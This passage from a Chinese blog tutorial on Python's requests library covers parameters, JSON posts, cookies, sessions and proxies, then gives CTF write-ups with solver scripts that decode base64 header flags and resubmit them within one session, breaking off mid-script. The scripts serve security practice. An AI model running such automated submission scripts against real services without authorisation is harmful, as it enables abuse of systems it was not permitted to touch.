+<span class="token operator">>></span><span class="token operator">></span>r<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">)</span>
+<span class="token string">'text/html; charset=utf-8'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="查看响应内容"><a href="#查看响应内容" class="headerlink" title="查看响应内容"></a>查看响应内容</h3><p>查看服务器返回页面的内容，以查看GET请求的响应内容为例，POST请求同理：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>text
+u'\n\n\n\n\n\n<span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span>\n<span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>\n  <span class="token operator">&lt;</span>head<span class="token operator">></span>\n    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>\n<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><code>Requests</code> 会自动解码来自服务器的内容。大多数 <code>unicode</code> 字符集都能被无缝地解码。</p>
+<p>请求发出后，<code>Requests</code> 会基于 <code>HTTP</code> 头部对响应的编码作出有根据的推测。当你访问 <code>r.text</code> 之时，<code>Requests</code> 会使用其推测的文本编码。你可以找出 <code>Requests</code> 使用了什么编码，并且能够使用<code>r.encoding</code> 属性来改变它：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>encoding
+<span class="token string">'utf-8'</span>
+<span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'ISO-8859-1'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="二进制响应内容"><a href="#二进制响应内容" class="headerlink" title="二进制响应内容"></a>二进制响应内容</h3><p>你也能以字节的方式访问请求响应体，对于非文本请求：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>content
+b'<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"repository"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"open_issues"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"url"</span><span class="token punctuation">:</span>"https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>Requests 会自动为你解码 gzip 和 deflate 传输编码的响应数据。</p>
+<p>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
+<span class="token operator">>></span><span class="token operator">></span> i <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="传递GET请求参数"><a href="#传递GET请求参数" class="headerlink" title="传递GET请求参数"></a>传递GET请求参数</h3><p>GET请求参数作为查询字符串附加在URL末尾，可以通过<code>requests.get()</code>方法中的<code>params</code>参数(<code>dict</code>类型变量)完成。例如，我要构建的URL为<code>https://github.com/?username=jwt&amp;id=1</code>，则可以通过以下代码传递<code>GET</code>请求参数：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> args <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'jwt'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>
+<span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> params <span class="token operator">=</span> args<span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>?username<span class="token operator">=</span>jwt<span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="传递POST请求参数"><a href="#传递POST请求参数" class="headerlink" title="传递POST请求参数"></a>传递POST请求参数</h3><p><code>POST</code>请求参数以表单数据的形式传递，可以通过<code>requests.post()</code>方法中的<code>data</code>参数(dict类型变量)或者<code>json</code>参数完成，由于github官网POST请求参数不以明文展现，此处改为了其他网站测试</p>
+<h4 id="使用data参数"><a href="#使用data参数" class="headerlink" title="使用data参数"></a>使用data参数</h4><p>具体代码如下：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> args <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'jwt'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>
+<span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>args<span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+  <span class="token string">"files"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token string">"form"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
+    <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
+    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"jwt"</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
+    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"*/*"</span><span class="token punctuation">,</span>
+    <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>
+    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"17"</span><span class="token punctuation">,</span>
+    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
+    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"httpbin.org"</span><span class="token punctuation">,</span>
+    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"python-requests/2.22.0"</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token string">"json"</span><span class="token punctuation">:</span> null<span class="token punctuation">,</span>
+  <span class="token string">"origin"</span><span class="token punctuation">:</span> <span class="token string">"3.112.219.149, 3.112.219.149"</span><span class="token punctuation">,</span>
+  <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://httpbin.org/post"</span>
+    
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="使用json参数"><a href="#使用json参数" class="headerlink" title="使用json参数"></a>使用json参数</h4><p>这里就记录一下如何用requests发送json格式的数据，因为一般我们post参数，都是直接post，没管post的数据的类型，此时其默认类型为：</p>
+<pre><code>application/x-www-form-urlencoded
+</code></pre>
+<p>但是，我们写程序的时候，最常用的接口post数据的格式是json格式。当我们需要post json格式数据的时候，怎么办呢，有两种方法：</p>
+<h5 id="1，在header中指定数据类型"><a href="#1，在header中指定数据类型" class="headerlink" title="1，在header中指定数据类型"></a>1，在header中指定数据类型</h5><p>详见如下代码:</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+ 
+data <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span>
+    <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">456</span>
+<span class="token punctuation">}</span>
+ 
+<span class="token comment" spellcheck="true">## headers中添加上content-type这个参数，指定为json格式</span>
+headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span>
+ 
+<span class="token comment" spellcheck="true">## post的时候，将data字典形式的参数用json包转换成json格式。</span>
+response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'url'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="2，直接使用json参数"><a href="#2，直接使用json参数" class="headerlink" title="2，直接使用json参数"></a>2，直接使用json参数</h5><p>现在较新版本的requests的post方法，已经默认提供一个json的参数，直接传入字典数据，自动完成以上的传话，使用json格式传输数据。</p>
+<p>代码如下：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+ 
+data <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span>
+    <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">456</span>
+<span class="token punctuation">}</span>
+ 
+<span class="token comment" spellcheck="true">## post的时候，使用json参数</span>
+response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'url'</span><span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>就可以发送json格式数据了。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://amos-x.com/index.php/amos/archives/python-requests-send-json/">python 使用requests发送json格式数据</a></p>
+<h3 id="传递Cookie参数"><a href="#传递Cookie参数" class="headerlink" title="传递Cookie参数"></a>传递Cookie参数</h3><blockquote>
+<p>HTTP 协议是无状态的。因此，若不借助其他手段，远程的服务器就无法知道以前和客户端做了哪些通信。Cookie 就是手段之一。<br>Cookie 用于记录用户在网站上的登录状态。</p>
+</blockquote>
+<p>如果想传递自定义<code>Cookie</code>到服务器，可以使用<code>cookies</code>参数(<code>dict</code>类型变量)。以<code>POST</code>请求为例提交自定义<code>Cookie</code>（<code>cookies</code>参数同样适用于<code>GET</code>请求）：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> mycookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'userid'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">}</span>
+<span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> cookies <span class="token operator">=</span> mycookie<span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'userid=123456'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="会话对象Session（）"><a href="#会话对象Session（）" class="headerlink" title="会话对象Session（）"></a>会话对象Session（）</h3><blockquote>
+<p>会话是存储在服务器上的相关用户信息，用于在有效期内保持客户端与服务器之间的状态.Session与Cookie配合使用，当会话或Cookie失效时，客户端与服务器之间的状态也随之失效。</p>
+</blockquote>
+<p>请求模块中的会话对象Session（）能够在多次请求中保持某些参数，使得底层的TCP连接将被重用，提高了HTTP连接的性能。</p>
+<p>Session（）的创建过程如下：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>在有效期内，同一个会话对象发出的所有请求都保持着相同的Cookie，可以看出，会话对象也可以通过get与post方法发送请求，以发送GET请求为例：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>'https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>我们来跨请求保持一些 cookie:</p>
+<pre class="line-numbers language-python"><code class="language-python">s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/cookies/set/sessioncookie/123456789'</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/cookies"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># '{"cookies": {"sessioncookie": "123456789"}}'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。</p>
+<p>不过需要注意，就算使用了会话，方法级别的参数也不会被跨请求保持。下面的例子只会和第一个请求发送 cookie ，而非第二个：</p>
+<pre class="line-numbers language-python"><code class="language-python">s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/cookies'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'from-my'</span><span class="token punctuation">:</span> <span class="token string">'browser'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># '{"cookies": {"from-my": "browser"}}'</span>
+
+r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/cookies'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># '{"cookies": {}}'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Cookie和Session区别"><a href="#Cookie和Session区别" class="headerlink" title="Cookie和Session区别"></a>Cookie和Session区别</h3><p>1.session 在服务器端，cookie 在客户端（浏览器）<br>2.session 默认被保存在服务器的一个文件里（不是内存）<br>3.session 的运行依赖 session id，而 session id 是存在 cookie 中的，也就是说，如果浏览器禁用了 cookie ，同时 session 也会失效（但是可以通过其它方式实现，比如在 url 中传递 session_id）<br>4.session 可以放在 文件、数据库、或内存中都可以。<br>5.用户验证这种场合一般会用 session<br>6.cookie目的可以跟踪会话，也可以保存用户喜好或者保存用户名密码<br>7.session用来跟踪会话<br><img src="https://i.loli.net/2019/08/08/CxvezroEm3OAQ26.png" alt="利用 Cookie 管理 Session"></p>
+<h3 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h3><p>如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+proxies <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.1.10:3128"</span><span class="token punctuation">,</span>
+  <span class="token string">"https"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.1.10:1080"</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span>
+
+requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://example.org"</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>你也可以通过环境变量 <code>HTTP_PROXY</code> 和<code>HTTPS_PROXY</code>来配置代理。</p>
+<pre class="line-numbers language-python"><code class="language-python">$ export HTTP_PROXY<span class="token operator">=</span><span class="token string">"http://10.10.1.10:3128"</span>
+$ export HTTPS_PROXY<span class="token operator">=</span><span class="token string">"http://10.10.1.10:1080"</span>
+
+$ python
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> requests
+<span class="token operator">>></span><span class="token operator">></span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://example.org"</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>若你的代理需要使用<code>HTTP Basic Auth</code>，可以使用 <code>http://user:password@host/</code>语法：</p>
+<pre class="line-numbers language-python"><code class="language-python">proxies <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"http://user:pass@10.10.1.10:3128/"</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>要为某个特定的连接方式或者主机设置代理，使用 <code>scheme://hostname</code> 作为 <code>key</code>， 它会针对指定的主机和连接方式进行匹配。</p>
+<pre class="line-numbers language-python"><code class="language-python">proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'http://10.20.1.128'</span><span class="token punctuation">:</span> <span class="token string">'http://10.10.1.10:5323'</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>注意，代理 <code>URL</code> 必须包含连接方式。</p>
+<h3 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h3><p>除了基本的 HTTP 代理，Request 还支持 SOCKS 协议的代理。这是一个可选功能，若要使用， 你需要安装第三方库。</p>
+<p>你可以用 pip 获取依赖:</p>
+<pre><code>$ pip install requests[socks]
+</code></pre>
+<p>安装好依赖以后，使用 SOCKS 代理和使用 HTTP 代理一样简单：</p>
+<pre><code>proxies = &#123;
+    &#39;http&#39;: &#39;socks5://user:pass@host:port&#39;,
+    &#39;https&#39;: &#39;socks5://user:pass@host:port&#39;
+&#125;
+</code></pre>
+<h2 id="Request在CTF中实战"><a href="#Request在CTF中实战" class="headerlink" title="Request在CTF中实战"></a>Request在CTF中实战</h2><h3 id="题目-天下武功唯快不破"><a href="#题目-天下武功唯快不破" class="headerlink" title="题目 天下武功唯快不破"></a>题目 天下武功唯快不破</h3><p>题目来源：实验吧<br>题目链接：<a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/10/10.php">http://ctf5.shiyanbar.com/web/10/10.php</a><br>题目信息：<br><img src="https://i.loli.net/2019/08/08/1lNP4u2rGeb6Foh.png"><br>打开题目，查看源码<br><img src="https://i.loli.net/2019/08/08/p4c3WLrZNVbKlOo.png"><br>题目提示请用<code>POST</code>请求提交你发现的信息，请求参数的键值是<code>key</code>。看看响应头，果然看到FLAG<br><img src="https://i.loli.net/2019/08/08/RTmZDJEC9Q84Luz.png"><br>将发现字符base64解码：<code>P0ST_THIS_T0_CH4NGE_FL4G:x63HymPc3</code><br><img src="https://i.loli.net/2019/08/08/PvYTriwqSd1Wjf2.png"><br>即<code>key=x63HymPc3</code><br>Hackbar手工提交 POST 请求会有什么效果：<br><img src="https://i.loli.net/2019/08/08/qg9uGRwPW7svBNO.png"><br>根据题目意思必须很快的提交，经过研究发现FLAG的值会改变，显然必须要用脚本来跑了，因此直接上 Python 脚本解题：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># python 2</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+url <span class="token operator">=</span> <span class="token string">"http://ctf5.shiyanbar.com/web/10/10.php"</span> <span class="token comment" spellcheck="true"># 目标URL</span>
+headers <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers <span class="token comment" spellcheck="true"># 获取响应头</span>
+key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取响应头中的Flag，用 split(':') 分离冒号两边的值，对象中的第二个元素即为要提交的 key 值</span>
+postData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> key<span class="token punctuation">}</span> <span class="token comment" spellcheck="true"># 构造Post请求体</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> postData<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 利用Post方式发送请求并打印响应内容 </span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行脚本，得到flag<br><img src="https://i.loli.net/2019/08/08/4BHYIawCf1KnPvM.png"></p>
+<h3 id="题目-速度要快"><a href="#题目-速度要快" class="headerlink" title="题目 速度要快"></a>题目 速度要快</h3><p>题目来源：bugku<br>题目链接：<a target="_blank" rel="noopener" href="http://123.206.87.240:8002/web6/">http://123.206.87.240:8002/web6/</a><br>题目信息：<br><img src="https://i.loli.net/2019/08/08/6sDuXIikrfQw1bV.png"></p>
+<blockquote>
+<p>此题是上一题的升级版，除了要求快速发送<code>POST</code>请求，还要求所有的请求必须在同一个<code>Session</code>内完成</p>
+</blockquote>
+<p>打开题目，查看源码<br><img src="https://i.loli.net/2019/08/08/MYZlHAX3TQmiCbk.png"><br>题目提示请用<code>POST</code>请求提交你发现的信息，请求参数的键值是<code>margin</code>。看看响应头，果然看到flag<br><img src="https://i.loli.net/2019/08/08/c4uTHyePG7RbAkz.png"><br>将发现字符base64解码：<code>跑的还不错，给你flag吧: MzIyMTk1</code><br><img src="https://i.loli.net/2019/08/08/tLUBo3u6A1CTSnP.png"><br>经过第一次base64解码后，flag仍然还是一段base64编码，所以要再解码一次。解题过程中，要自行动手查看每一次解码后的值，才能选择合适的方法去获得最终key值。<br><img src="https://i.loli.net/2019/08/08/Ro8YkHwaBJC6Mul.png"><br>Hackbar手工提交 POST 请求会有什么效果:<br><img src="https://i.loli.net/2019/08/08/bMm9OkgixA2lPU3.png"><br>根据题目意思必须很快的提交，经过研究发现flag的值会改变，显然必须要用脚本来跑了，因此直接上 Python 脚本解题<br>但是直接用上题脚本发现，发现还是提示快一点<br>因此查看GET请求和POST请求的<code>请求头</code>与<code>响应头</code>是否内有玄机<br><img src="https://i.loli.net/2020/05/20/LwF4Kk3bJNmXvqs.png"><br>果然如此，GET请求和POST请求的响应头的Set-Cookie值不相同，即不在同一个会话中，因此编写脚本<br><strong>方法一</strong>：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># python 2</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+url <span class="token operator">=</span> <span class="token string">'http://123.206.87.240:8002/web6/'</span>
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取 Session</span>
+headers <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers
+key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"margin"</span><span class="token punctuation">:</span>key<span class="token punctuation">}</span> 
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> post<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用会话对象Session()的get和post方法使GET请求与POST请求在同一个Session中</p>
+<p>运行脚本，得到flag<br><img src="https://i.loli.net/2019/08/08/zkJerUat28BfyA9.png"><br><strong>方法二</strong>：<br>既然只需要保持两次请求中 Cookie 属性相同，那能不能构造 Cookie 属性通过普通的 get 与 post 方法完成呢？答案是可以的。请见如下代码：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># python 2</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+url <span class="token operator">=</span> <span class="token string">'http://120.24.86.145:8002/web6/'</span>
+headers <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers
+key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"margin"</span><span class="token punctuation">:</span> key<span class="token punctuation">}</span> 
+PHPSESSID <span class="token operator">=</span> headers<span class="token punctuation">[</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
